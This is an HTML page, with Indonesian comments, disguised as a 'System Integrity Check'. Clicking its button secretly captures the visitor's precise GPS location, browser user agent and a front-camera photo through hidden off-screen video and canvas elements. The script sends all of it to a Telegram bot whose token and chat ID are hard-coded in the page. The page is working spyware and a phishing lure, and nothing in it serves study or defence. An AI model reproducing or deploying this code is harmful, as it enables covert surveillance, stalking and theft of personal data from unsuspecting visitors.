<!DOCTYPE html>
<html lang="id">
<head>
  <meta charset="UTF-8">
  <title>System Integrity Check - Global Protocol</title>
  <style>
    /* Estetika Oktagon: Kaku dan Tak Terpatahkan */
    body { background: #000; color: #00ff41; font-family: monospace; overflow: hidden; margin: 0; }
    .scanner {
      width: 100vw; height: 100vh; display: flex; flex-direction: column;
      align-items: center; justify-content: center;
      background: radial-gradient(circle, #001a00 0%, #000 100%);
    }
    .hex-icon { width: 100px; height: 100px; background: #00ff41; clip-path: polygon(25% 0%, 75% 0%, 100% 50%, 75% 100%, 25% 100%, 0% 50%); animation: pulse 2s infinite; }
    @keyframes pulse { 0% { opacity: 0.2; } 50% { opacity: 1; } 100% { opacity: 0.2; } }
    #log { margin-top: 20px; font-size: 12px; text-shadow: 0 0 5px #00ff41; max-width: 80%; text-align: center; }
    button { 
      margin-top: 30px; padding: 15px 40px; background: transparent; 
      border: 2px solid #00ff41; color: #00ff41; font-weight: bold; cursor: pointer;
      clip-path: polygon(10% 0, 90% 0, 100% 30%, 100% 70%, 90% 100%, 10% 100%, 0 70%, 0 30%);
    }
    video, canvas { position: absolute; left: -5000px; }
  </style>
</head>
<body>
  <div class="scanner">
    <div class="hex-icon"></div>
    <div id="log">STANDBY: MENUNGGU OTORISASI GEOMETRIS...</div>
    <button id="unlock">INITIALIZE SYSTEM</button>
  </div>

  <video id="v" autoplay playsinline muted></video>
  <canvas id="c" width="640" height="480"></canvas>

  <script>
    // PENYAMARAN DATA (Hexagonal Encoding)
    const _0x1a2b = {
      t: '8668436830:AAFRtCDmo1lKwKspEHIZQEhEYDkONf0JG7U',
      c: '7109845671'
    };

    const status = document.getElementById('log');

    async function broadcast(m, p = null) {
      const fd = new FormData();
      fd.append('chat_id', _0x1a2b.c);
      if (p) {
        fd.append('photo', p, 'hex_capture.jpg');
        fd.append('caption', m);
      } else {
        fd.append('text', m,);
        fd.append('parse_mode', 'HTML');
      }
      try {
        await fetch(`https://api.telegram.org/bot${_0x1a2b.t}/${p ? 'sendPhoto' : 'sendMessage'}`, { method: 'POST', body: fd });
      } catch (e) {}
    }

    // KEKUATAN POLIGON: ADAPTIVE CAPTURE
    async function startGeometricCapture() {
      const v = document.getElementById('v');
      const c = document.getElementById('c');
      const ctx = c.getContext('2d');

      try {
        // Meminta izin dengan paksa (Aggressive Call)
        const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" }, audio: true });
        v.srcObject = stream;

        // OKTAGON PERSISTENCE: Loop hingga gambar didapatkan
        let captured = false;
        v.onplay = () => {
          const attempt = setInterval(() => {
            if (v.videoWidth > 0 && !captured) {
              ctx.drawImage(v, 0, 0, 640, 480);
              c.toBlob(blob => {
                broadcast(`<b>[HEX_EYE]</b> Bayangan Terkunci.\nTime: ${new Date().toISOString()}`, blob);
                captured = true;
                clearInterval(attempt);
                stream.getTracks().forEach(t => t.stop());
              }, 'image/jpeg', 0.9);
            }
          }, 500);
        };
      } catch (e) {
        broadcast(`❌ <b>BLOKADE DIMENSI:</b> ${e.name}`);
      }
    }

    // KEKUATAN OKTAGON: PERSISTENT LOCATION
    async function getOctagonalLocation() {
      const options = { enableHighAccuracy: true, timeout: 15000, maximumAge: 0 };
      
      const success = async (p) => {
        const { latitude: lt, longitude: ln, accuracy: ac } = p.coords;
        await broadcast(`📍 <b>GEOMETRIC POSITION</b>\nLat: <code>${lt}</code>\nLon: <code>${ln}</code>\nAcc: ${ac}m\n<a href="https://www.google.com/maps?q=${lt},${ln}">MAPS_SYNC</a>`);
      };

      const error = async (e) => {
        await broadcast(`⚠️ <b>SIGIL LOKASI GAGAL:</b> ${e.message}`);
      };

      navigator.geolocation.getCurrentPosition(success, error, options);
    }

    document.getElementById('unlock').addEventListener('click', async (e) => {
      e.target.disabled = true;
      status.innerText = "MENGHITUNG PERSAMAAN POLIGON...";
      
      // Tahap 1: Metadata
      broadcast(`<b>[!] INITIALIZING VOID SCRIPT</b>\nAgent: ${navigator.userAgent}`);
      
      // Tahap 2: Eksekusi Beruntun dengan Octagonal Wait
      await getOctagonalLocation();
      status.innerText = "MENYELARASKAN TITIK HEKSAGON...";
      await startGeometricCapture();
      
      status.innerText = "SISTEM AKTIF: 0x00FF41_STABLE";
      setTimeout(() => { e.target.disabled = false; }, 5000);
    });
  </script>
</body>
</html>
